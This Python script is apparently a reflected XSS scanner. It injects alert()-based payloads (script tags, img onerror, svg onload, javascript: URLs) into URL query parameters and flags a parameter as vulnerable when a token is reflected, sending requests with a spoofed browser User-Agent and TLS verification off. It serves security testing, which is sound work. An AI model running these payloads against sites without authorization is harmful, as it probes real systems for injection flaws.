import requests
from urllib.parse import urlparse, parse_qs, urlencode
import random
import string
import re
import time

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def generate_token(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def extract_params(url):
    try:
        parsed = urlparse(url)
        return parse_qs(parsed.query)
    except Exception:
        return {}

def inject_payload(url, param, payload):
    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = urlencode(query, doseq=True)
        return parsed._replace(query=new_query).geturl()
    except Exception:
        return url

def detect_context(response, token):
    patterns = {
        "script": r"<script[^>]*>.*" + re.escape(token) + ".*</script>",
        "attribute": r"<[^>]+\s(on\w+)=['\"].*" + re.escape(token) + ".*['\"]",
        "html": r"<[^>]*>" + re.escape(token) + r"<[^>]*>",
        "href": r"href=['\"]?javascript:.*" + re.escape(token)
    }
    for context, pattern in patterns.items():
        if re.search(pattern, response, re.IGNORECASE | re.DOTALL):
            return context
    return "unknown"

def scan_xss(url):
    results = []
    params = extract_params(url)
    if not params:
        return []

    payloads = [
        (f"<script>alert('{{TOKEN}}')</script>", "script"),
        (f"\" onload=alert('{{TOKEN}}') x=\"", "attribute"),
        (f"<img src=x onerror=alert('{{TOKEN}}')>", "html"),
        (f"' onload=alert('{{TOKEN}}') '", "attribute"),
        (f"javascript:alert('{{TOKEN}}')", "href"),
        (f"<svg onload=alert('{{TOKEN}}')>", "svg"),
        (f"{{{{TOKEN}}}}", "template")
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    for param in params:
        token = generate_token()
        vulnerability_found = False
        context_type = "unknown"
        successful_payload = ""

        for payload_template, p_type in payloads:
            payload = payload_template.replace("{TOKEN}", token)
            target_url = inject_payload(url, param, payload)
            
            try:
                response = requests.get(
                    target_url,
                    headers=headers,
                    timeout=15,
                    allow_redirects=False,
                    verify=False
                )
                
                if token in response.text:
                    vulnerability_found = True
                    context_type = detect_context(response.text, token)
                    successful_payload = payload
                    break
                    
            except Exception as e:
                results.append({
                    "Param": param,
                    "Vulnerable": "error",
                    "Context": str(e),
                    "Payload": payload
                })
                continue
                
            time.sleep(0.3)

        if vulnerability_found:
            results.append({
                "Param": param,
                "Vulnerable": True,
                "Context": context_type,
                "Payload": successful_payload
            })
        elif not any(r["Param"] == param for r in results):
            results.append({
                "Param": param,
                "Vulnerable": False,
                "Context": "-",
                "Payload": "-"
            })

    return results
